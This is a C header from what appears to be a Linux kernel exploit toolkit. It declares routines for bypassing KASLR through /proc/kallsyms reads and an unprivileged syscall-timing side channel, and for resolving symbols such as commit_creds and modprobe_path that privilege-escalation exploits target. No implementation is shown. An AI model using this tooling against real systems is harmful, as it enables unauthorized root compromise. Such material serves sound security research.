#ifndef ANGBAND_KASLR_H
#define ANGBAND_KASLR_H

#include "common.h"

/* Kernel symbol addresses resolved at runtime */
struct kaslr_ctx {
    unsigned long commit_creds;
    unsigned long prepare_kernel_cred;
    unsigned long init_task;
    unsigned long modprobe_path;
    unsigned long loopback_dev;
    unsigned long _printk;
    unsigned long kernel_base;
    int valid; /* 1 if leak succeeded */
};

/**
 * kaslr_leak_kallsyms_parent - Read kallsyms in the initial namespace.
 *
 * Reads /proc/kallsyms to resolve kernel symbol addresses.
 * Must be called BEFORE entering any user namespace (i.e., in the
 * parent process before clone).  Requires kptr_restrict to be disabled
 * or /proc/sys/kernel/kptr_restrict to allow non-root reads.
 *
 * Returns 0 on success, -1 on failure.
 */
int kaslr_leak_kallsyms_parent(struct kaslr_ctx *out);

/**
 * kaslr_leak_sidechannel - Purely userspace KASLR bypass.
 *
 * Uses syscall entry timing side-channel to determine kernel base.
 * Works from any namespace, no privileges required.
 * Requires CPU pinning (caller must pin to a single core first).
 *
 * Granularity: ~2MB (coarse KASLR).  For fine-grained offsets,
 * combine with symbol-offset database from target config.
 *
 * Returns 0 on success, -1 on failure.
 */
int kaslr_leak_sidechannel(struct kaslr_ctx *out);

/**
 * kaslr_apply_offsets - Compute symbols from kernel_base + offsets.
 *
 * When we have a coarse kernel base from the side channel, apply
 * known symbol offsets (from target config / DWARF info) to compute
 * exact symbol addresses.
 */
void kaslr_apply_offsets(struct kaslr_ctx *ctx,
                         long off_commit_creds,
                         long off_prepare_kernel_cred,
                         long off_init_task,
                         long off_modprobe_path,
                         long off_loopback_dev);

#endif
